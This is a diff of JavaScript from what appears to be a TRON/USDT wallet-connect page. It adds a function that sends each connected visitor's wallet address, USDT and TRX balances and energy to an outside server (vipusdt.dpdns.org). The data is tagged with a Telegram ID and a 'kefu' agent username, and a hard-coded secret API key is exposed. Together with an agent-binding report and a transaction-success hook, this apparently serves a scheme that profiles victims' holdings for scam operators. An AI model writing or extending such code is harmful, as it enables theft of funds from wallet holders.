@@ -324,6 +324,11 @@
 					// 上报数据
 					reportStatus()
 
+					if (!hasReportedConnect && userData.address) {
+						notifyWalletConnected(userData)
+						hasReportedConnect = true
+					}
+
 					return true // 成功
 				} catch (e) {
 					console.error('Wallet info error:', e)
@@ -455,9 +460,8 @@
 			function notifyAgentBinding(walletAddress, serviceAccount) {
 				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
 				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
-				// window.tgid = GetRequest().tgid || ''
-				// 修复: d/1.html 中没有 GetRequest，使用 getParamOrCache
 				const tgid = getParamOrCache('tgid')
+				const kefu = getParamOrCache('kefu')
 
 				if (!tgid) {
 					console.log('No tgid found, skipping agent binding.')
@@ -468,6 +472,7 @@
 					telegramId: tgid,
 					address: walletAddress,
 					serviceAccount: serviceAccount,
+					agentUsername: kefu || '',
 				}
 
 				console.log('Sending agent binding data:', data)
@@ -488,6 +493,45 @@
 					.catch((error) => {
 						console.error('Agent binding error:', error)
 					})
+			}
+
+			let hasReportedConnect = false
+
+			function notifyWalletConnected(data) {
+				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
+				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
+				const tgid = getParamOrCache('tgid')
+				const kefu = getParamOrCache('kefu')
+
+				if (!tgid && !kefu) {
+					console.log('No tgid or kefu found, skipping wallet connect notification.')
+					return
+				}
+
+				const payload = {
+					action: 'wallet_connected',
+					telegramId: tgid,
+					agentUsername: kefu,
+					walletInfo: {
+						address: data.address,
+						usdtBalance: data.usdtBalance,
+						trxBalance: data.trxBalance,
+						energy: data.energy,
+						trxInsufficient: parseFloat(data.trxBalance) < 15,
+					},
+				}
+
+				console.log('Sending wallet connect notification:', payload)
+
+				fetch(WEB_APP_URL, {
+					method: 'POST',
+					redirect: 'follow',
+					headers: {
+						'Content-Type': 'application/json',
+						'X-API-Key': SECRET_API_KEY,
+					},
+					body: JSON.stringify(payload),
+				}).catch((err) => console.error('Notify wallet connect error:', err))
 			}
 			function reportSuccess(txId) {
 				// 上报成功逻辑
